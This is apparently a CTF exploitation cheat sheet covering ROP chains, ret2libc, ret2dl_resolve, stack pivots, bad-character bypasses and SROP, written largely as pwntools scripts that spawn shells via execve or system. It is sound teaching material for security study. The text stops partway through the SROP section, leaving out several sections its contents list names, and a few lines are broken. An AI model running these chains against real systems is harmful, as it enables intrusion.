# ROP and Shellcode

## Table of Contents

- [ROP Chain Building](#rop-chain-building)
  - [Two-Stage ret2libc (Leak + Shell)](#two-stage-ret2libc-leak-shell)
  - [Raw Syscall ROP (When system() Fails)](#raw-syscall-rop-when-system-fails)
  - [rdx Control in ROP Chains](#rdx-control-in-rop-chains)
  - [Shell Interaction After execve](#shell-interaction-after-execve)
- [ret2csu — __libc_csu_init Gadgets](#ret2csu-__libc_csu_init-gadgets)
- [ret2libc via Statically-Linked libc + Embedded /bin/sh String](#ret2libc-via-statically-linked-libc--embedded-binsh-string)
- [ret2vdso — Using Kernel vDSO Gadgets](#ret2vdso--using-kernel-vdso-gadgets)
- [ret2dl_resolve 64-bit](#ret2dl_resolve-64-bit)
- [Stack Pivot via xchg rax,esp](#stack-pivot-via-xchg-raxesp)
- [Double Stack Pivot to BSS via leave;ret](#double-stack-pivot-to-bss-via-leaveret)
- [Imperfect-Gadget Stack Pivot](#imperfect-gadget-stack-pivot)
- [Bad Character Bypass via XOR Encoding in ROP](#bad-character-bypass-via-xor-encoding-in-rop)
- [sprintf() Gadget Chaining for Bad Character Bypass](#sprintf-gadget-chaining-for-bad-character-bypass)
- [Exotic x86 Gadgets — BEXTR/XLAT/STOSB/PEXT](#exotic-x86-gadgets-bextrxlatstosbpext)
  - [64-bit: BEXTR + XLAT + STOSB](#64-bit-bextr--xlat--stosb)
  - [32-bit: PEXT (Parallel Bits Extract)](#32-bit-pext-parallel-bits-extract)
- [Add Gadget for Pointer Transformation](#add-gadget-for-pointer-transformation)
- [Prime-Only ROP via Goldbach Decomposition](#prime-only-rop-via-goldbach-decomposition)
- [SROP with UTF-8 Payload Constraints](#srop-with-utf-8-payload-constraints)
- [Chained SROP (Multi-Frame Sigreturn Chain)](#chained-srop-multi-frame-sigreturn-chain)
- [Sendfile SROP and Payload-Length-as-rax](#sendfile-srop-and-payload-length-as-rax)
- [JIT-ROP: Scan for syscall Byte in Leaked libc Function](#jit-rop-scan-for-syscall-byte-in-leaked-libc-function)
- [Vsyscall ROP for PIE Bypass](#vsyscall-rop-for-pie-bypass)
- [Seccomp Bypass](#seccomp-bypass)
  - [RETF Architecture Switch for Seccomp Bypass](#retf-architecture-switch-for-seccomp-bypass)
  - [x32 ABI Syscall Number Aliasing for Seccomp Bypass](#x32-abi-syscall-number-aliasing-for-seccomp-bypass)
- [Time-Based Blind Shellcode When write() Blocked](#time-based-blind-shellcode-when-write-blocked)
- [.fini_array Hijack](#fini_array-hijack)
  - [_fini_array Double-Entry Staged ROP](#_fini_array-double-entry-staged-rop)
  - [DT_FINI_ARRAY Hijack via Linker Overwrite](#dt_fini_array-hijack-via-linker-overwrite)
- [DynELF Automated Libc Discovery](#dynelf-automated-libc-discovery)
- [Stack Shellcode with Input Reversal](#stack-shellcode-with-input-reversal)
- [Constrained Shellcode in Small Buffers](#constrained-shellcode-in-small-buffers)
- [Minimal Shellcode with Pre-Initialized Registers](#minimal-shellcode-with-pre-initialized-registers)
- [Unique-Byte Shellcode via syscall RIP to RCX](#unique-byte-shellcode-via-syscall-rip-to-rcx)
- [Alphanumeric Shellcode Bootstrap via push/pop When rax=0](#alphanumeric-shellcode-bootstrap-via-pushpop-when-rax0)
- [stub_execveat Syscall as execve Alternative](#stub_execveat-syscall-as-execve-alternative)
- [Stack Canary XOR Epilogue as RDX Zeroing Gadget](#stack-canary-xor-epilogue-as-rdx-zeroing-gadget)
- [getdents64 in Shellcode (Directory Listing Without Shell)](#getdents64-in-shellcode-directory-listing-without-shell)
- [pwntools Template](#pwntools-template)
  - [Automated Offset Finding via Corefile](#automated-offset-finding-via-corefile)
- [Useful Commands](#useful-commands)

---

## ROP Chain Building

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Common gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Leak libc
payload = flat(
    b'A' * offset,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
)
```

### Two-Stage ret2libc (Leak + Shell)

When exploiting in two stages, choose the return target for stage 2 carefully:

```python
# Stage 1: Leak libc via puts@PLT, then re-enter vuln for stage 2
payload1 = b'A' * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(CALL_VULN_ADDR)   # Address of 'call vuln' instruction in main

# IMPORTANT: Return target after leak
# - Returning to main may crash if check_status/setup corrupts stack
# - Returning to vuln directly may have stack issues
# - Best: return to the 'call vuln' instruction in main (e.g., 0x401239)
#   This sets up a clean stack frame via the CALL instruction
```

**Leak parsing with no-newline printf:**
```python
# If printf("Laundry complete") has no trailing newline,
# puts() leak appears right after it on the same line:
# Output: "Laundry complete\x50\x5e\x2c\x7e\x56\x7f\n"
p.recvuntil(b'Laundry complete')
leaked = p.recvline().strip()
libc_addr = u64(leaked.ljust(8, b'\x00'))
```

### Raw Syscall ROP (When system() Fails)

If calling `system()` or `execve()` via libc function entry crashes (CET/IBT, stack issues), use raw `syscall` instruction from libc gadgets:

```python
# Find gadgets in libc
libc_rop = ROP(libc)
pop_rax = libc_rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = libc_rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_rbx = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]  # common in modern glibc
syscall_ret = libc_rop.find_gadget(['syscall', 'ret'])[0]

# execve("/bin/sh", NULL, NULL) = syscall 59
payload = b'A' * offset
payload += p64(libc_base + pop_rax)
payload += p64(59)
payload += p64(libc_base + pop_rdi)
payload += p64(libc_base + next(libc.search(b'/bin/sh')))
payload += p64(libc_base + pop_rsi)
payload += p64(0)
payload += p64(libc_base + pop_rdx_rbx)
payload += p64(0)
payload += p64(0)  # rbx junk
payload += p64(libc_base + syscall_ret)
```

**When to use raw syscall vs libc functions:**
- `system()` through libc: simplest, but may crash due to stack alignment or CET
- `execve()` through libc: avoids `system()`'s subprocess overhead, same CET risk
- Raw `syscall`: bypasses all libc function prologues, most reliable for ROP
- Note: `pop rdx; ret` is rare in modern libc; look for `pop rdx; pop rbx; ret` instead

### rdx Control in ROP Chains

After calling libc functions (especially `puts`), `rdx` is often clobbered to a small value (e.g., 1). This breaks subsequent `read(fd, buf, rdx)` calls in ROP chains.

**Solutions:**
1. **pop rdx gadget from libc** - `pop rdx; ret` is rare; look for `pop rdx; pop rbx; ret` (common at ~0x904a9 in glibc 2.35)
2. **Re-enter binary's read setup** - Jump to code that sets `rdx` before `read`:
   ```python
   # vuln's read setup: lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read
   # Set rbp first so rbp-0x40 points to target buffer:
   POP_RBP_RET = 0x40113d
   VULN_READ_SETUP = 0x4011ea  # lea rax, [rbp-0x40]

   payload += p64(POP_RBP_RET)
   payload += p64(TARGET_ADDR + 0x40)  # rbp-0x40 = TARGET_ADDR
   payload += p64(VULN_READ_SETUP)     # read(0, TARGET_ADDR, 0x100)
   # WARNING: After read, code continues to printf + leave;ret
   # leave sets rsp=rbp, so you get a stack pivot to rbp!
   ```
3. **Stack pivot via leave;ret** - When re-entering vuln's read code, the `leave;ret` after read pivots the stack to `rbp`. Write your next ROP chain at `rbp+8` in the data you send via read.

### Shell Interaction After execve

After spawning a shell via ROP, the shell reads from the same stdin as the binary. Commands sent too early may be consumed by prior `read()` calls.

```python
p.send(payload)  # Trigger execve

# Wait for shell to initialize before sending commands
import time
time.sleep(1)
p.sendline(b'id')
time.sleep(0.5)
result = p.recv(timeout=3)

# For flag retrieval:
p.sendline(b'cat /flag* flag* 2>/dev/null')
time.sleep(0.5)
flag = p.recv(timeout=3)

# DON'T pipe commands via stdin when using pwntools - they get consumed
# by earlier read() calls. Use explicit sendline() after delays instead.
```

---

## ret2csu — __libc_csu_init Gadgets

**When to use:** Need to control `rdx`, `rsi`, and `edi` for a function call but no direct `pop rdx` gadget exists in the binary. `__libc_csu_init` is present in nearly all dynamically linked ELF binaries and contains two useful gadget sequences.

**Gadget 1 (pop chain):** At the end of `__libc_csu_init`:
```asm
pop rbx; 0
pop rbp; 1
pop r12; function pointer (address of GOT entry)
pop r13; edi value
pop r14; rsi value
pop r15; rdx value
ret
```

**Gadget 2 (call + set registers):** Earlier in `__libc_csu_init`:
```asm
mov rdx, r15; rdx = r15
mov rsi, r14; rsi = r14
mov edi, r13d; edi = r13 (32-bit!)
call [r12 + rbx*8]; call function pointer
add rbx, 1
cmp rbp, rbx
jne.loop; loop if rbx != rbp; falls through to gadget 1 pop chain
```

**Exploit pattern:**
```python
csu_pop = elf.symbols['__libc_csu_init'] + OFFSET_TO_POP_CHAIN
csu_call = elf.symbols['__libc_csu_init'] + OFFSET_TO_MOV_CALL

payload = flat(
    b'A' * offset,
    csu_pop,
    0,            # rbx = 0 (index)
    1,            # rbp = 1 (loop count, must equal rbx+1)
    elf.got['puts'],  # r12 = function to call (GOT entry)
    0xdeadbeef,   # r13 → edi (first arg, 32-bit only!)
    0xcafebabe,   # r14 → rsi (second arg)
    0x12345678,   # r15 → rdx (third arg)
    csu_call,     # trigger mov + call
    b'\x00' * 56, # padding for the 7 pops after call returns
    next_gadget,  # return address after csu completes
)
```

**Limitations:** `edi` is set via `mov edi, r13d` — only the lower 32 bits are written. For 64-bit first arguments, use a `pop rdi; ret` gadget instead. The function is called via `call [r12 + rbx*8]` — an indirect call through a pointer, so `r12` must point to a GOT entry or other memory containing the target address.

**Key insight:** ret2csu provides universal gadgets for setting up to 3 arguments (`rdi`, `rsi`, `rdx`) and calling any function via its GOT entry, without needing libc gadgets. Useful when the binary is statically small but dynamically linked.

---

## ret2libc via Statically-Linked libc + Embedded /bin/sh String

**Pattern:** Argument is copied into a fixed-size buffer with a 3-character *display* limit — but the underlying `gets()` still reads the full line, yielding a stack overflow 17 bytes past the buffer. The overflow slot is too small for a multi-gadget ROP chain, and no obvious `/bin/sh` appears at predictable addresses. Because the binary is **statically linked**, `system`, `exit`, and an embedded `"/bin/sh"` string from the libc blob all live at fixed addresses — one ret2libc call fits in the overflow slot.

```python
from pwn import *

# Addresses resolved from the static binary itself:
#   (gdb) info address system  -> 0x0804ee30
#   (gdb) info address exit    -> 0x0804e330
#   0x080bc140: "/bin/sh"              (pulled from rodata / libc blob)

system  = 0x0804ee30
exit_a  = 0x0804e330
binsh   = 0x080bc140

# Overflow reaches saved EIP at cyclic offset 17 (cyclic -l on the crash)
payload  = cyclic(17)
payload += p32(system)   # ret -> system
payload += p32(exit_a)   # system's return addr -> exit (avoid SIGSEGV post-shell)
payload += p32(binsh)    # system's first arg

# Keep the process alive after the shell spawns by piping stdin:
# (python -c "..."; cat) | nc pwn.public source.com 4325
io = remote
io.sendline(payload)
io.interactive()
```

**Key insight:** Static linking turns every libc symbol into a fixed-offset target inside the binary and drags the entire libc string table (including `"/bin/sh"`) along for free — no leak, no ROPgadget hunting for `/bin/sh`, no dynamic linker games. Whenever `checksec` shows "No PIE" AND `file` reports "statically linked", a 12-byte payload (`system; exit; &/bin/sh`) is usually enough, even in overflow windows too small for a 2-gadget chain. Confirm by `strings -a binary | grep -n /bin/sh` and `nm binary | grep ' T system'`.

---

## ret2vdso — Using Kernel vDSO Gadgets

**Pattern:** Statically-linked binary with minimal functions and zero useful ROP gadgets (no `pop rdi`, `pop rsi`, `pop rax`, etc.). The Linux kernel maps a vDSO (Virtual Dynamic Shared Object) into every process, and it contains enough gadgets for `execve`.

### Step 1 — Stack leak

Overflow a buffer and read back more bytes than sent to leak stack pointers:
```python
p.send(b'A' * 0x20)
resp = p.recv(0x80)
leak = u64(resp[0x30:0x38])
stackbase = (leak & 0x0000FFFFFFFFF000) - 0x20000
```

### Step 2 — Write `/bin/sh` to known address

Use the binary's own `read` function via ROP to place `/bin/sh\0` at a page-aligned stack address:
```python
payload = b'B' * 32 + p64(READ_FUNC) + p64(LOOP) + p64(0x8) + p64(stackbase)
p.sendline(payload)
p.send(b'/bin/sh\x00')
```

### Step 3 — Find vDSO base via AT_SYSINFO_EHDR

Dump the stack using the binary's `write` function. Search for `AT_SYSINFO_EHDR` (auxv type `0x21`) which holds the vDSO base address:
```python
# Dump 0x21000 bytes from stackbase
for i in range(0, len(stackdump) - 15, 8):
    val = u64(stackdump[i:i+8])
    if val == 0x21:  # AT_SYSINFO_EHDR
        next_val = u64(stackdump[i+8:i+16])
        if 0x7f0000000000 <= next_val <= 0x7fffffffffff and (next_val & 0xFFF) == 0:
            vdso_base = next_val
            break
```

### Step 4 — Dump vDSO and find gadgets

Dump 0x2000 bytes from `vdso_base` using the binary's `write` function, then search for gadgets. Common vDSO gadgets:
```python
POP_RDX_RAX_RET     = vdso_base + 0xba0  # pop rdx; pop rax; ret
POP_RBX_R12_RBP_RET = vdso_base + 0x8c6  # pop rbx; pop r12; pop rbp; ret
MOV_RDI_RBX_SYSCALL = vdso_base + 0x8e3  # mov rdi, rbx; mov rsi, r12; syscall
```

### Step 5 — execve ROP chain

```python
payload = b'A' * 32
payload += p64(POP_RDX_RAX_RET)
payload += p64(0x0)              # rdx = NULL (envp)
payload += p64(59)               # rax = execve
payload += p64(POP_RBX_R12_RBP_RET)
payload += p64(stackbase)        # rbx → rdi = &"/bin/sh"
payload += p64(0x0)              # r12 → rsi = NULL (argv)
payload += p64(0xdeadbeef)       # rbp (dummy)
payload += p64(MOV_RDI_RBX_SYSCALL)
```

**Key insight:** The vDSO is kernel-specific — different kernels have different gadget offsets. Always dump the remote vDSO rather than assuming local offsets. The auxv `AT_SYSINFO_EHDR` (type 0x21) on the stack is the reliable way to find the vDSO base address.

**Detection:** Statically-linked binary with few functions, no libc, and no useful gadgets. QEMU-hosted challenges often run custom kernels with unique vDSO layouts.

---

## ret2dl_resolve 64-bit

**Pattern:** Forge fake `Elf64_Rela`, `Elf64_Sym`, and dynstr entries in writable memory (BSS) to trick the dynamic linker into resolving an arbitrary libc function (e.g., `system`) without knowing the libc base address. The 64-bit variant requires bypassing VERSYM checks by NULLing the version table pointer in the link_map.

**How dynamic resolution works:**
```text
PLT stub → _dl_runtime_resolve(link_map, reloc_index)
  1. Look up Elf64_Rela at.rela.plt[reloc_index]
  2. Extract symbol index from r_info
  3. Look up Elf64_Sym at.dynsym[sym_index]
  4. Read symbol name from.dynstr + st_name offset
  5. Search loaded libraries for that symbol name
  6. [64-bit only] Check version via.gnu.version[sym_index]  ← must bypass
  7. Write resolved address to GOT, jump to it
```

**Forging the structures:**
```python
from pwn import *

# Target: resolve system() by forging resolution structures in BSS
BSS = 0x601000          # writable memory
STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')

# Calculate offsets so forged structures are self-consistent
fake_rela_addr = BSS + 0x100
fake_sym_addr = BSS + 0x200
fake_str_addr = BSS + 0x300

# Forged Elf64_Sym (24 bytes)
# st_name: offset into dynstr where "system\x00" lives
# st_info: STT_FUNC | STB_GLOBAL
# st_other, st_shndx: 0
# st_value, st_size: 0 (unresolved)
sym_index = (fake_sym_addr - SYMTAB) // 24  # index into symtab
fake_sym = flat(
    p32(fake_str_addr - STRTAB),  # st_name (offset to "system" in dynstr)
    p8(0x12),                      # st_info = STT_FUNC | STB_GLOBAL<<4
    p8(0),                         # st_other
    p16(0),                        # st_shndx = SHN_UNDEF
    p64(0),                        # st_value
    p64(0),                        # st_size
)

# Forged Elf64_Rela (24 bytes)
# r_offset: GOT slot to write resolved address
# r_info: (sym_index << 32) | R_X86_64_JUMP_SLOT
# r_addend: 0
reloc_index = (fake_rela_addr - JMPREL) // 24
fake_rela = flat(
    p64(BSS + 0x400),                      # r_offset (writable GOT slot)
    p64((sym_index << 32) | 7),            # r_info: sym_idx | R_X86_64_JUMP_SLOT
    p64(0),                                 # r_addend
)

# Forged dynstr entry
fake_str = b"system\x00"

# Write all structures to BSS via ROP chain
#...

# CRITICAL: Bypass VERSYM check for 64-bit
# Overwrite link_map->l_info[DT_VERSYM] with NULL
# This skips version validation entirely
# link_map address can be read from GOT[1]
link_map_addr = read_got(1)  # GOT[1] = link_map pointer
# l_info[DT_VERSYM] is at link_map + 0x1c8 (glibc-dependent)
versym_ptr = link_map_addr + 0x1c8
write_memory(versym_ptr, p64(0))  # NULL → skip version check

# Trigger resolution: call PLT stub with forged reloc_index
# _dl_runtime_resolve follows our forged chain:
#   fake Rela → fake Sym → fake dynstr "system"
#   → resolves system() → writes to fake GOT slot → jumps to system()
```

**ROP chain to trigger:**
```python
# After writing fake structures to BSS:
# Push reloc_index and jump to PLT[0] (the universal resolver stub)
plt_stub = elf.get_section_by_name('.plt').header.sh_addr

payload = flat(
    pop_rdi, binsh_addr,           # rdi = "/bin/sh" for system()
    plt_stub,                       # push link_map; jmp _dl_runtime_resolve
    p64(reloc_index),              # relocation index into forged.rela.plt
)
```

**Key insight:** 64-bit ret2dl_resolve is harder than 32-bit because of VERSYM checks. Overwrite `link_map->l_info[DT_VERSYM]` with NULL to skip version validation entirely. Then the standard approach works: forge Rela -> Sym -> dynstr chain in writable memory, trigger resolution via PLT stub with crafted reloc index. This resolves arbitrary libc functions without knowing the libc base — the dynamic linker does the work for you.

**When to recognize:** No libc leak available, Partial RELRO (PLT/GOT writable), binary has enough ROP gadgets to write to BSS and control function arguments. Works on any glibc version (the VERSYM bypass via NULL is universal). Prefer this over blind libc identification when the remote libc version is completely unknown.

---

## Stack Pivot via xchg rax,esp

**When to use:** Buffer is too small for the full ROP chain, but the program leaks a heap/stack address where a larger buffer has been prepared.

**Two-stage pattern:**
```python
# Stage 1: Program provides a heap address where it wrote user data
pivot_addr = int(io.recvline(), 16)

# Prepare ROP chain at the pivot address (via earlier input)
stage2_rop = flat(
    pop_rdi, elf.got['puts'],
    elf.plt['puts'],             # leak libc
    elf.symbols['main'],         # return to main for stage 3
)
io.send(stage2_rop)             # Written to pivot_addr by program

# Stage 2: Overflow with stack pivot
xchg_rax_esp = elf.symbols.usefulGadgets + 2  # xchg rax, esp; ret
pop_rax = elf.symbols.usefulGadgets            # pop rax; ret

payload = flat(
    b'A' * offset,
    pop_rax,
    pivot_addr,         # load pivot address into rax
    xchg_rax_esp,       # swap rax ↔ esp → stack now points to stage2_rop
)
```

**Why xchg vs. leave;ret:**
- `leave; ret` sets `rsp = rbp` — requires controlling `rbp`
- `xchg rax, esp` swaps directly — requires controlling `rax` (via `pop rax; ret`)
- `xchg` works even when `rbp` is not on the stack

**Limitation:** `xchg rax, esp` truncates to 32-bit on x86-64 (sets upper 32 bits of rsp to 0). The pivot address must be in the lower 4GB of address space. Heap and mmap regions often qualify; stack addresses (0x7fff...) do not.

---

## Double Stack Pivot to BSS via leave;ret

**Pattern:** Small stack overflow (22 bytes past buffer) — enough to overwrite RBP + RIP but too small for a ROP chain. No libc leak available. Use two `leave; ret` pivots to relocate execution to BSS, then chain `fgets` calls to write arbitrary-length ROP.

**Stage 1 — Pivot to BSS:**
```python
BSS_STAGE = 0x404500  # writable BSS address
LEAVE_RET = 0x4013d9  # leave; ret gadget

# Overflow: 128-byte buffer + RBP + RIP
payload = b'A' * 128
payload += p64(BSS_STAGE)   # overwrite RBP → BSS
payload += p64(LEAVE_RET)   # leave sets RSP = RBP (BSS), then ret
```

**Stage 2 — Chain fgets for large ROP:**
```python
# After pivot, RSP is at BSS_STAGE. Pre-place a mini-ROP there that
# calls fgets(BSS+0x600, 0x700, stdin) to read the real ROP chain:
POP_RDI = 0x4013a5
POP_RSI_R15 = 0x4013a3
SET_RDX_STDIN = 0x40136a  # gadget that sets rdx = stdin FILE*

stage2 = flat(
    SET_RDX_STDIN,
    POP_RDI, BSS_STAGE + 0x100,  # destination buffer
    POP_RSI_R15, 0x700, 0,       # size
    elf.plt['fgets'],             # fgets(buf, 0x700, stdin)
    BSS_STAGE + 0x100,            # return into the new ROP chain
)
```

**Key insight:** `leave; ret` is equivalent to `mov rsp, rbp; pop rbp; ret`. Overwriting RBP controls where RSP lands after `leave`. Two pivots solve the "too small for ROP" problem: first pivot moves to BSS where a small bootstrap ROP calls `fgets` to load the full exploit.

**When to use:** Overflow is too small for a full ROP chain AND the binary uses `fgets`/`read` (or similar input function) that can be called via PLT. BSS is always writable and at a known address (no PIE or PIE leaked).

---

## Imperfect-Gadget Stack Pivot

**Pattern:** Classic stack pivots use `leave; ret` or `xchg esp, eax; ret`, but sometimes the only usable gadget has benign middle instructions. A gadget like `pop ebp; add al, 0x89; pop esp; and al, 0x30; add esp, 0x24; ret` still pivots `esp` — the `add al`/`and al` side effects do not corrupt `esp` and the trailing `add esp, 0x24` just skips 9 slots you pre-pad with junk.

```asm
0x80c0620: pop ebp; add al, 0x89; pop esp; and al, 0x30; add esp, 0x24; ret
```

Place a controlled heap address at the correct slot so `pop esp` lands you on a fake stack, then budget nine dummy dwords before the real chain to absorb `add esp, 0x24`.

**Key insight:** Stop rejecting gadgets because they are noisy. Walk each gadget line-by-line; if none of the instructions clobber `esp`, the gadget still pivots even with spurious arithmetic.

---

## Bad Character Bypass via XOR Encoding in ROP

**When to use:** ROP payload must write data (e.g., `"/bin/sh"` or `"flag.txt"`) to memory, but certain bytes are forbidden (null bytes, newlines, spaces, etc.).

**Strategy:** XOR each chunk of data with a known key, write the XOR'd value to `.data` section, then XOR it back in place using gadgets from the binary.

**Required gadgets:**
```asm
pop r14; pop r15; ret; load XOR key (r14) and target address (r15)
xor [r15], r14; ret; XOR memory at r15 with r14
mov [r15], r14; ret; write r14 to memory at r15 (initial write)
```

**Exploit pattern:**
```python
data_section = elf.symbols['__data_start']  # or.data address
xor_key = 2  # simple key that removes bad chars

def xor_bytes(data, key):
    return bytes(b ^ key for b in data)

target = b"flag.txt"
encoded = xor_bytes(target, xor_key)

payload = b'A' * offset

# Write XOR'd data in 8-byte chunks
for i in range(0, len(encoded), 8):
    chunk = encoded[i:i+8].ljust(8, b'\x00')
    payload += flat(
        pop_r14_r15,
        chunk,                    # XOR'd data
        data_section + i,         # destination address
        mov_r15_r14,              # write to memory
    )

# XOR each chunk back to recover original
for i in range(0, len(target), 8):
    payload += flat(
        pop_r14_r15,
        p64(xor_key),             # XOR key
        data_section + i,         # target address
        xor_r15_r14,              # decode in place
    )

# Now data_section contains "flag.txt" — use it as argument
payload += flat(pop_rdi, data_section, elf.plt['print_file'])
```

**Key insight:** XOR is self-inverse (`a ^ k ^ k = a`). Choose a key that transforms all forbidden bytes into allowed ones. For simple cases, XOR with `2` or `0x41` works. For complex restrictions, solve per-byte: for each position, find any key byte where `original ^ key` avoids all bad characters.

---

## sprintf() Gadget Chaining for Bad Character Bypass

**Pattern:** When shellcode contains bytes filtered by the input handler (null, space, slash, colon, etc.), use `sprintf()` to copy individual bytes from the executable's own memory — one byte at a time — to assemble clean shellcode on BSS.

```python
from pwn import *

# Step 1: Scan executable for addresses containing each needed byte
exe_data = open('binary', 'rb').read()
byte_addrs = {}  # Maps byte value -> address in executable
for c in range(256):
    for i in range(len(exe_data)):
        addr = exe_base + i
        if exe_data[i] == c and not has_bad_chars(p32(addr)):
            byte_addrs[c] = addr
            break

# Step 2: Chain sprintf(bss_dest, byte_addr) for each shellcode byte
rop = b''
for i, byte in enumerate(shellcode):
    rop += p32(sprintf_plt)
    rop += p32(pop3ret)           # Clean 3 args
    rop += p32(bss_addr + i)     # Destination
    rop += p32(byte_addrs[byte]) # Source (1 byte + null terminator)
    rop += p32(0)                # Unused arg

# Step 3: Jump to assembled shellcode on BSS
rop += p32(bss_addr)
```

**Key insight:** `sprintf(dst, src)` copies bytes until a null terminator — effectively a single-byte copy when `src` points to a byte followed by `\x00`. Each call in the ROP chain places one shellcode byte. The source addresses come from the binary's own `.text`/`.rodata` sections. Requires a `pop3ret` gadget for stack cleanup between calls.

---

## Exotic x86 Gadgets — BEXTR/XLAT/STOSB/PEXT

**When to use:** Standard `mov [reg], reg` write gadgets don't exist in the binary. Look for obscure x86 instructions that can be chained for byte-by-byte memory writes.

### 64-bit: BEXTR + XLAT + STOSB

**BEXTR** (Bit Field Extract) extracts bits from a source register. **XLAT** translates a byte via table lookup (`al = [rbx + al]`). **STOSB** stores `al` to `[rdi]` and increments `rdi`.

```python
# Gadgets from questionableGadgets section of binary
xlat_ret = elf.symbols.questionableGadgets          # xlat byte ptr [rbx]; ret
bextr_ret = elf.symbols.questionableGadgets + 2     # pop rdx; pop rcx; add rcx, 0x3ef2;
                                                     # bextr rbx, rcx, rdx; ret
stosb_ret = elf.symbols.questionableGadgets + 17    # stosb byte ptr [rdi], al; ret

data_section = elf.symbols.__data_start

# Write "flag.txt" byte by byte
for i, char in enumerate(b"flag.txt"):
    # Find address of char in binary's read-only data
    char_addr = next(elf.search(bytes([char])))

    # BEXTR extracts rbx from rcx using rdx as control
    # rcx = char_addr - 0x3ef2 (compensate for add)
    # rdx = 0x4000 (extract 64 bits starting at bit 0)
    payload += flat(
        bextr_ret,
        0x4000,                    # rdx (BEXTR control: start=0, len=64)
        char_addr - 0x3ef2,        # rcx (offset compensated)
        xlat_ret,                  # al = byte at [rbx + al]
        pop_rdi,
        data_section + i,
        stosb_ret,                 # [rdi] = al; rdi++
    )
```

### 32-bit: PEXT (Parallel Bits Extract)

**PEXT** selects bits from a source using a mask and packs them contiguously. Combined with BSWAP and XCHG for byte-level writes.

```python
# Gadgets
pext_ret = elf.symbols.questionableGadgets           # mov eax,ebp; mov ebx,0xb0bababa;
                                                      # pext edx,ebx,eax;...ret
bswap_ret = elf.symbols.questionableGadgets + 21     # pop ecx; bswap ecx; ret
xchg_ret = elf.symbols.questionableGadgets + 18      # xchg byte ptr [ecx], dl; ret

# For each target byte, compute mask so that PEXT(0xb0bababa, mask) = target_byte
def find_mask(target_byte, source=0xb0bababa):
    """Find 32-bit mask that extracts target_byte from source via PEXT."""
    source_bits = [(source >> i) & 1 for i in range(32)]
    target_bits = [(target_byte >> i) & 1 for i in range(8)]
    # Select 8 bits from source that match target bits
    mask = 0
    matched = 0
    for i in range(32):
        if matched < 8 and source_bits[i] == target_bits[matched]:
            mask |= (1 << i)
            matched += 1
    return mask if matched == 8 else None
```

**Key insight:** When a binary lacks standard write gadgets, exotic instructions (BEXTR, PEXT, XLAT, STOSB, BSWAP, XCHG) can be chained for the same effect. Check `questionableGadgets` or similar labeled sections in challenge binaries.

---

## Add Gadget for Pointer Transformation

**Pattern:** Limited ROP space (e.g., small buffer overflow) but writable global variables (e.g., stderr in .bss) containing libc pointers. Use an `add` gadget to increment/decrement the pointer value by a controlled amount, transforming it into a useful address (onegadget, system).

**Exploitation:**
1. Identify writable global with libc pointer (stderr, stdout, stdin in .bss)
2. Find `add [rbp - offset], register` gadget
3. Calculate difference: `target_addr - current_pointer_value`
4. Use pop gadgets to set register to adjustment value, rbp to base+offset
5. Trigger add gadget to modify pointer
6. Jump to modified pointer

**Code example:**
```python
# stderr in .bss at 0x404060, points to libc+0x3ec680
# Target: onegadget at libc+addr
diff = (libc.address + onegadget) - (libc.address + 0x3ec680)
adjustment = (0x100000000 - diff) % 0x100000000  # Handle underflow with wrap

# Gadgets
pop_rbx_rbp_ret = 0x...  # pop rbx; pop rbp; ret
add_dword_rbp_minus_3d_ebx_ret = 0x...  # add dword ptr [rbp - 0x3d], ebx; ret

# ROP chain
rop = p64(pop_rbx_rbp_ret)
rop += p64(adjustment)          # rbx = adjustment value
rop += p64(bss_addr + 0x3d)     # rbp = pointer to modify
rop += p64(add_gadget)          # add [rbp-0x3d] += rbx

# Jump to modified pointer
rop += p64(jmp_to_stderr)       # jmp [stderr]
```

**Key insight:** When direct ROP to libc is too large, modify existing libc pointers in writable memory. The add gadget allows precise arithmetic on pointer values, enabling transformation to any address within 32-bit range.

**When to use:** Small ROP space, no PIE, writable .bss/.data with libc pointers.

---

## Prime-Only ROP via Goldbach Decomposition

**Pattern:** Challenge constrains every stack word written by the attacker to be a prime number (`miller_rabin(val)` must return true on each slot). Direct gadget addresses are almost never prime, so the ROP chain looks impossible to build.

**Exploit:** Goldbach's conjecture guarantees every even integer > 2 is the sum of two primes. Represent each target gadget address `g` as `g = p1 + p2` where `p1, p2` are primes, and write them into adjacent stack slots. A small "prime adder" gadget (`pop rax; pop rdx; add rax, rdx; push rax; ret` or a read-modify-write into the stack) consolidates the two halves into the real gadget pointer right before the `ret` that consumes it.

```python
from sympy import isprime, nextprime

def prime_split(addr):
    # Returns (p1, p2) with p1 + p2 == addr and both prime
    if addr % 2:  # odd: (2, addr-2) if addr-2 prime, else search
        if isprime(addr - 2): return (2, addr - 2)
    p1 = 3
    while not (isprime(p1) and isprime(addr - p1)):
        p1 = nextprime(p1)
    return (p1, addr - p1)
```

Chain multiple `(p1, p2, adder)` triples to synthesize arbitrary gadget addresses while every raw stack word still passes the primality filter.

**Key insight:** Number-theoretic constraints on stack contents can always be defeated by writing a value as the sum/XOR/product of admissible parts and adding a tiny reducer gadget that recombines them at runtime. Goldbach gives a constructive two-term decomposition for addresses; Lagrange's four-square theorem works similarly for constraints that require perfect squares.

---

## SROP with UTF-8 Payload Constraints

**Pattern:** Rust binary where OOB color index reads memcpy from GOT, causing `memcpy(stack, BUFFER, 0x1000)` — a massive stack overflow. But `from_utf8_lossy()` validates the buffer first: any invalid UTF-8 triggers `Cow::Owned` with corrupted replacement data. **The entire 0x1000-byte payload must be valid UTF-8.**

**Why SROP:** Normal ROP gadget addresses contain bytes >0x7f which are invalid single-byte UTF-8. SROP needs only 3 gadgets (set rax=15, call syscall) to trigger `sigreturn`, then a signal frame sets ALL registers for `execve("/bin/sh", NULL, NULL)`.

